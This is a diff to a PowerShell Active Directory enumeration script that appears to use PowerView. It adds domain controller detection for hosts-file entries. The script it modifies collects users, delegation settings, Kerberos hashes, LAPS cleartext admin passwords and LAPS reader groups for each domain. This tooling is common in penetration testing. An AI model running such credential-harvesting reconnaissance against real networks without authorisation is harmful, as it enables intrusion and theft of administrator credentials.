@@ -54,6 +54,28 @@ foreach ($d in $domains) {
     Write-Host ''
     Write-Host "Processing: $d" -ForegroundColor Cyan
 
+    # Determine for this domain which DC to use (kept for other uses/prints)
+    $DomainFQDN    = $d
+    $pdc           = Get-NetDomainController -Domain $DomainFQDN | Select-Object -First 1
+    $PrimaryFQDN   = $pdc.HostName
+    $PrimaryDCName = $pdc.Name
+
+    # Collect ALL DC identifiers for this domain (both short and FQDN, normalized) ---
+    $dcs      = Get-NetDomainController -Domain $DomainFQDN | Select-Object HostName,Name
+    $dcFqdns  = @()
+    $dcShorts = @()
+    foreach ($dc in $dcs) {
+        if ($dc.HostName) { $dcFqdns  += $dc.HostName.ToLower() }
+        if ($dc.Name) {
+            $dcShort  = ($dc.Name -split '\.')[0]
+            if ($dcShort) { $dcShorts += $dcShort.ToLower() }
+            # Some envs report FQDN in Name; capture that too
+            if ($dc.Name -like '*.*') { $dcFqdns += $dc.Name.ToLower() }
+        }
+    }
+    $dcFqdns  = $dcFqdns  | Where-Object { $_ } | Sort-Object -Unique
+    $dcShorts = $dcShorts | Where-Object { $_ } | Sort-Object -Unique
+
     # Prepare per-domain files
     $computersFile = "${d}_computers.txt"
     $usersFile     = "${d}_users.txt"
@@ -89,11 +111,23 @@ foreach ($d in $domains) {
     Write-Host '  Computers file:' -NoNewline; Write-Host " $computersFile" -ForegroundColor Yellow
     Get-Content $computersFile | ForEach-Object { Write-Host "    $_" }
 
-    # Accumulate for hosts entries
-    $HostList += $computers |
-                 Select-Object IP,
-                               @{Name='Hostname';Expression={$_.FQDN}},
-                               @{Name='Alias';Expression={$_.Name}}
+    # Accumulate for hosts entries (NOW: inject domain for ALL DCs in this domain)
+    foreach ($entry in $computers) {
+        $short = ($entry.Name  | ForEach-Object { ($_ -split '\.')[0].ToLower() })
+        $fqdn  = ($entry.FQDN  | ForEach-Object { $_.ToLower() })
+        $isDC  = $false
+        if ($short -and ($dcShorts -contains $short)) { $isDC = $true }
+        elseif ($fqdn -and ($dcFqdns -contains $fqdn)) { $isDC = $true }
+
+        $domainAlias = if ($isDC) { $DomainFQDN } else { '' }
+
+        $HostList += [PSCustomObject]@{
+            IP       = $entry.IP
+            Hostname = $entry.FQDN
+            Domain   = $domainAlias
+            Alias    = $entry.Name
+        }
+    }
 
     # Enumerate users
     $users = Get-NetUser -Domain $d |
@@ -106,6 +140,7 @@ foreach ($d in $domains) {
       Out-File $usersFile -Encoding utf8
     Write-Host '  Users file:' -NoNewline; Write-Host " $usersFile" -ForegroundColor Yellow
     Get-Content $usersFile | ForEach-Object { Write-Host "    $_" }
+    Write-Host ""
 
     # 1) Unconstrained delegation
     $uFile = "${d}_unconstrained.txt"
@@ -132,7 +167,7 @@ foreach ($d in $domains) {
     Get-DomainComputer -Domain $d -Properties name,msds-allowedtodelegateto |
       Where-Object { $_.'msds-allowedtodelegateto' } |
       ForEach-Object {
-          $source = $_.Name
+          $source  = $_.Name
           $targets = $_.'msds-allowedtodelegateto' -join ', '
           "{0} => {1}" -f $source, $targets
       } |
@@ -180,17 +215,14 @@ foreach ($d in $domains) {
       Out-File $kFile -Encoding utf8
     Write-Host "  Kerberos hashes: $kFile" -ForegroundColor Yellow
     Get-Content $kFile | ForEach-Object {
-        if ($_ -eq '') { Write-Host "" }
-        else { Write-Host "    $_" }
+        if ($_ -eq '') { Write-Host "" } else { Write-Host "    $_" }
     }
     Write-Host ""
 
     # 6) LAPS-configured computers
     $lapsFile = "${d}_laps_hosts.txt"
     Get-DomainComputer -Domain $d -LDAPFilter '(ms-Mcs-AdmPwdExpirationtime=*)' |
-      ForEach-Object {
-          "$($_.Name): $($_.'ms-mcs-admpwd')"
-      } |
+      ForEach-Object { "$($_.Name): $($_.'ms-mcs-admpwd')" } |
       Out-File $lapsFile -Encoding utf8
     Write-Host "  LAPS hosts: $lapsFile" -ForegroundColor Yellow
     Get-Content $lapsFile | ForEach-Object { Write-Host "    $_" }
@@ -204,9 +236,7 @@ foreach ($d in $domains) {
           ($_.ObjectAceType -like 'ms-Mcs-AdmPwd') -and
           ($_.ActiveDirectoryRights -match 'ReadProperty')
       } |
-      ForEach-Object {
-          Convert-SidToName $_.SecurityIdentifier.Value
-      } |
+      ForEach-Object { Convert-SidToName $_.SecurityIdentifier.Value } |
       Sort-Object -Unique |
       Out-File $lapsGroupFile -Encoding utf8
     Write-Host "  LAPS reader groups: $lapsGroupFile" -ForegroundColor Yellow
@@ -215,15 +245,11 @@ foreach ($d in $domains) {
 
     # Accumulate potential active users with Groups
     $activeUsers = $users |
-                   Where-Object {
-                       $_.LastLogon -is [DateTime] -and
-                       $_.LastLogon.Year -gt 1900
-                   }
+                   Where-Object { $_.LastLogon -is [DateTime] -and $_.LastLogon.Year -gt 1900 }
     if ($activeUsers) {
         foreach ($u in $activeUsers) {
             try {
-                $groups = Get-DomainGroup -MemberIdentity $u.User -Domain $d |
-                          Select-Object -ExpandProperty SamAccountName
+                $groups    = Get-DomainGroup -MemberIdentity $u.User -Domain $d | Select-Object -ExpandProperty SamAccountName
                 $groupList = $groups -join ','
             } catch {
                 $groupList = ''
@@ -248,10 +274,11 @@ Get-Content 'potential_users.txt' | ForEach-Object { Write-Host "  $_" }
 
 # Write hosts entries
 $HostList |
-  Format-Table IP, Hostname, Alias -AutoSize -HideTableHeaders |
+  Format-Table IP, Hostname, Domain, Alias -AutoSize -HideTableHeaders |
   Out-String -Width 120 |
   Out-File 'etc_hosts.txt' -Encoding utf8
 Write-Host "`nHosts Entries file: etc_hosts.txt" -ForegroundColor Yellow
 Get-Content 'etc_hosts.txt' | ForEach-Object { Write-Host "  $_" }
 
 Write-Host 'Done!' -ForegroundColor Magenta
+
